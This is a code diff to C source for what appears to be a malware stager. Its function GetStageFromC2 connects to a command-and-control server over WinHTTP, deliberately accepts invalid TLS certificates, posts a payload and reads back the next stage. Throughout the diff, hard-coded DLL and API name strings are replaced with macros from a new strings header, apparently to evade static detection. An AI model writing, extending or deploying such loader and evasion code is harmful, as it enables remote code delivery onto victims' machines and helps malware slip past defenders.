@@ -3,6 +3,7 @@
 
 #include "settings.h"
 #include "imports.h"
+#include "strings.h"
 
 #define _CALLBACK_URL L"/stage"
 #define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\r\n"
@@ -26,7 +27,7 @@ CHAR* GetStageFromC2(DWORD* sSize)
             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
     // init the connection
-    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpOpen");
+    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_OPEN);
     hSession = rWinHttpOpen((LPCWSTR)_CALLBACK_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession)
     {
@@ -34,7 +35,7 @@ CHAR* GetStageFromC2(DWORD* sSize)
     }
 
     // make the connection
-    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpConnect");
+    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_CONNECT);
     hConnect = rWinHttpConnect(hSession, (LPCWSTR)_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, 0);
     if (!hConnect)
     {
@@ -42,7 +43,7 @@ CHAR* GetStageFromC2(DWORD* sSize)
     }
 
     // setup our request
-    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpOpenRequest");
+    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_OPENREQ);
     hRequest = rWinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
     if (!hRequest)
     {
@@ -50,7 +51,7 @@ CHAR* GetStageFromC2(DWORD* sSize)
     }
 
     // let us connect with bad ssl certs
-    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpSetOption");
+    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_SETOPT);
     if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(Flags)))
     {
         return NULL;
@@ -77,20 +78,20 @@ CHAR* GetStageFromC2(DWORD* sSize)
     #endif
 
     // make the request
-    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpSendRequest");
+    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_SENDREQ);
     bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)payload, strlen(payload), strlen(payload), 0);
 
     if (bResults)
     {
         DEBUG("made callback");
-        WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpReceiveResponse");
+        WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_RECVRES);
         bResults = rWinHttpReceiveResponse(hRequest, NULL);
 
         do 
         {
             // check how much available data there is
             dwSize = 0;
-            WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpQueryDataAvailable");
+            WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_DATAAVA);
             if (!rWinHttpQueryDataAvailable( hRequest, &dwSize)) 
             {
                 DEBUG( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
@@ -114,7 +115,7 @@ CHAR* GetStageFromC2(DWORD* sSize)
             // read all the data
             ZeroMemory(pszOutBuffer, dwSize + 1);
 
-            WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(LoadLibrary("winhttp.dll"), "WinHttpReadData");
+            WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_READATA);
             if (!rWinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
             {                                  
                 // been an error
